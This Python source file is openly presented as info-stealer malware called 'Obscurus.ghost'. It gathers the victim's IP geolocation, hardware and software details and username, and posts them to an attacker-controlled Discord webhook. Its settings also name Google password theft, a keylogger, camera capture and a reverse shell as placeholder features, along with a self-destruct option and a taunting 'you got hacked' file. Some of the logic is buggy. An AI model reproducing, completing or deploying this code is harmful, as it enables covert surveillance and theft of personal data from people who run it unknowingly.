#Obscurus.ghost by burnt.chipset

__author__ = ('burnt.chipset')
__organization__ = ('Obscurus.network')
__version__ = ('v1.0.3')
__appname__ = ('Obscurus.ghost')


#customization of behavior // settings
#network info, ip, open ports
network_info_setting = True

#pc username, python etc
software_info_setting = True

#hardware info, disk space etc
hardware_info_setting = True

#retry the request if fails
retry_request_setting = False

#retry request retry count, how much times do you want to try to re-send the request
request_for_retry = int('10')

#self-destructs when finished
self_destruct_setting = False

#screenshots the desktop
desktop_screenshot_setting = True

#disable when linux
disable_when_linux_setting = False

#the movie mode, starts playing music and fucks up the visuals, this isnt ment for normal usage, only for fun
movie_mode_setting = False

#movie mode file setting, creates a cool easter egg hidden in the file system. The file is placed in the directory of appdata which has a name of the __appaname__
movie_mode_file_setting = False

#self-hide, moves it's self into temp directory, so it is harder to find, paired with movie mode
self_hide_setting = False

#google passwords stealing
google_passwords_setting = True

#keylogger setting placeholder
keylogger_setting = False

#camera snap placeholder
camera_capture = False

#reverse shell setting placeholder
reverse_shell_setting = False

####REVERSE SHELL SETTING####

reverse_shell_ip = ''
reverse_shell_port = ''

#webhook url to send the embed to
webhook_url='WEBHOOK_HERE'

#background url for the movie mode
movie_mode_background_url = 'URL_TO_JPEG'

#imports
import requests
import os
#checking if os is windows
if os != 'nt':
    windows_mode = False
else:
    windows_mode = True


#####PATHS######
#and getting the path of the file
full_path = os.path.realpath(__file__)
path, filename = os.path.split(full_path)

#roaming
if windows_mode == True:
    roaming_dir = os.getenv('AppData')
else:
    pass

#getting PID
process_pid = os.getpid()

import sys
import datetime
import platform
import psutil
import socket
import ctypes
import netifaces
import subprocess
import signal
import shutil

from datetime import date

#placeholder for linux
if disable_when_linux_setting == True and windows_mode == False:
    os.kill(process_pid, signal.SIGSTOP)
else:
    pass


if network_info_setting == True:
    ip_request = requests.get("https://ipinfo.io/json")
    data = ip_request.json()
    ip = data.get('ip')
    ip_info_req = requests.get(f'http://ip-api.com/json/{ip}?fields=66846719')
    ip_info = ip_info_req.json()
    continent_value = ip_info.get("continent")
    country_value = ip_info.get("country")
    region_value = ip_info.get("regionName")
    city_value = ip_info.get("city")
    district_value = ip_info.get("district")
    zip_code_value = ip_info.get("zip")
    lat_value = ip_info.get("lat")
    lon_value = ip_info.get("lon")
    timezone_value = ip_info.get("timezone")
    offset_value = ip_info.get("offset")
    currency_value = ip_info.get("currency")
    isp_value = ip_info.get("isp")
    as_value = ip_info.get("as")
    org_value = ip_info.get("org")
    is_mobile_value = ip_info.get("mobile")
    has_proxy_value = ip_info.get("proxy")
    is_hosting = ip_info.get("hosting")  

    network_info = (f"""

    [$] IP - {ip}

    [$] Continent - {continent_value}

    [$] Country - {country_value}

    [$] Region - {region_value}

    [$] City - {city_value}

    [$] District - {district_value}

    [$] ZIP/Postal code - {zip_code_value}

    [$] Latitude - {lat_value}

    [$] Longtitude - {lon_value}

    [$] Timezone - {timezone_value}

    [$] Offset - {offset_value}

    [$] Currency - {currency_value}

    [$] ISP - {isp_value}

    [$] AS - {as_value}

    [$] ORG - {org_value}

    [$] Mobile (celular) - {is_mobile_value}
 
    [$] Proxy - {has_proxy_value}

    [$] Hosting - {is_hosting}

    """)
else:
    location_info = ("Location info us turned OFF")


if os != "nt":
    hardware_log = ("Running linux, unable to get the info")
    pass
else:
    if hardware_info_setting == True:
        cpufreq = psutil.cpu_freq()
        svmem = psutil.virtual_memory()
        partitions = psutil.disk_partitions()
        disk_io = psutil.disk_io_counters()
        net_io = psutil.net_io_counters()

        hardware_log = (f"""
    
        [$] Cpu Frequency - {cpufreq}

        [$] Vram - {svmem} 

        [$] Partitions - {partitions}

        [$] Disks - {disk_io}

        [$] Net IO - {net_io}""")
    else:
        hardware_log = ("Hardware Info is turned OFF") 

if software_info_setting == True: 
    machine1 = platform.machine()
    version1 = platform.version()
    platform1 = platform.platform()
    uname1 = platform.uname()
    network_name = platform.node()
    python = platform.python_build()
    system1 = platform.system()
    username = os.getlogin()
    process1 = platform.processor()
    computername = socket.gethostname()
    localipaddress = socket.gethostbyname(computername)
    date_of_extraction = date.today()
    general_info = (f""" 

    [$] Machine - {machine1}

    [$] Username - {username}
                     
    [$] Version - {version1}

    [$] Platform - {platform1}

    [$] Username 2 - {uname1}

    [$] NetName - {network_name}

    [$] Python - {python}

    [$] System - {system1}

    [$] Processor - {process1}

    [$] PCname - {computername}

    [$] Date - {date_of_extraction}""")
else:
    general_info = ("Logging of general informations is turned OFF")

    ip_info = ("IP info is turned OFF")

if google_passwords_setting == True and windows_mode == True:
    #placeholder
    google_passwords_extracted = ('running windows')

else:
    google_passwords_extracted = ('Google password stealing is turned OFF')

if windows_mode == False:
    google_passwords_extracted = ('Target running linux, unable to grab')


data_to_discord = {
    'username': f"{__appname__} - {__version__}",
    'avatar_url': 'https://media.discordapp.net/attachments/991719502792372277/1060131150137405501/rly.jpeg'
}

data_to_discord["embeds"] = [
                {
                    'type': 'rich',
                    'color': 0xaa00f3,
                    'thumbnail': {
                        'url': 'https://cdn.discordapp.com/attachments/1062049894631755997/1066356255322550333/MOSHED-2023-1-8-17-0-15.jpg',
                        'height': 100,
                        'width': 200,
                    },
                    'author': {
                        'name': f'{__appname__} {__version__} by {__author__}',
                        'url': 'https://github.com/Obscurus-network/Obscurus.ghost',
                        'icon_url': 'https://cdn.discordapp.com/attachments/1062049894631755997/1066356255322550333/MOSHED-2023-1-8-17-0-15.jpg'
                    },
                    'description': f'''{date_of_extraction} - Instance of {__appname__} was ran by {username}, serving the results now: ''',
                    'fields': [
                        {  
                            'name': " - Config - ",
                            'value':f''' 

                            [$] Network logging - {network_info_setting}

                            [$] Software info - {software_info_setting}

                            [$] Self-destruct - {self_destruct_setting}

                            [$] Retry request - {retry_request_setting}

                            [$] Hardware logging - {hardware_info_setting}

                            [$] Movie mode - {movie_mode_setting}

                            [$] Movie mode file - {movie_mode_file_setting}

                            [$] Google passwords - {google_passwords_setting}

                            Current path of the file is:
                            {path}/{filename}

                            Current process ID is:
                            {process_pid}
                            
                            '''

                        },
                        {
                            'name': ' - General informations - ',
                            'value': f'''

                            {general_info}
                            
                            '''
                        },
                        {
                            'name': ' - Hardware informations - ',
                            'value': f'''

                            {hardware_log}
                            
                            '''
                        },
                        {
                            'name': ' - Google passwords - ',
                            'value': f'''

                            {google_passwords_extracted}
                            
                            '''
                        },
                        {
                            'name': ' - Location - ',
                            'value': f'''

                            {network_info}

                            '''
                        }

                    ],
                    'footer': {
                        'text': f' {__appname__} - {__version__} \\ {__author__}@{__organization__}',
                        'icon_url': 'https://media.discordapp.net/attachments/1062049894631755997/1072162925583814666/c6086bfd3cff4651b05ccb60480348f5.png'
                    }
            }
]

result = requests.post(webhook_url, json = data_to_discord)


if movie_mode_setting == True and windows_mode == False:
    os.chdir(roaming_dir)
    os.mkdir(__appname__)
    os.chdir(roaming_dir + "/" + __appname__)
    #getting the wallpaper
    get_wallpaper = requests.get(movie_mode_background_url)
    #writing it into a file
    open("background", "wb").write(get_wallpaper.content)
    #wallpaper written, now we will write the easter egg if enabled
    if movie_mode_file_setting == True:
        easter_egg_file = open("README.md", "x")
        easter_egg_file.write(f"""

                                   [$] LOOKS LIKE YOU GOT HACKED [$]

                            [$] Hack sponsored by: {__appname__} {__version__}

                            [$] Developed by: {__author__}@{__organization__}


                         !!!!I, THE CREATOR. AM NOT RESPONSIBLE FOR WHAT HAPPEND!!!!


        the project is open-source and anyone can use this, only reason you are able to see this file is because the attacker
        which owns this instance of the virus enabled this file to be written in settings of the virus
        
        
                             - {__author__}
        """)
    else:
        pass
else:
    pass
    



if retry_request_setting == True:
    request_for_retry = (requests.post(webhook_url, json = data_to_discord))
    if result.status_code !=200:
        for x in request_for_retry(url_retry_attempts):
            request_for_retry 
    else:
        pass
else: 
    pass
    

#SELF-DESTRUCT
if self_destruct_setting == True:
    os.remove(path + '/' + filename)
else: 
    pass



#People you know can hurt you the most <---- most social-engeneering this on the earth
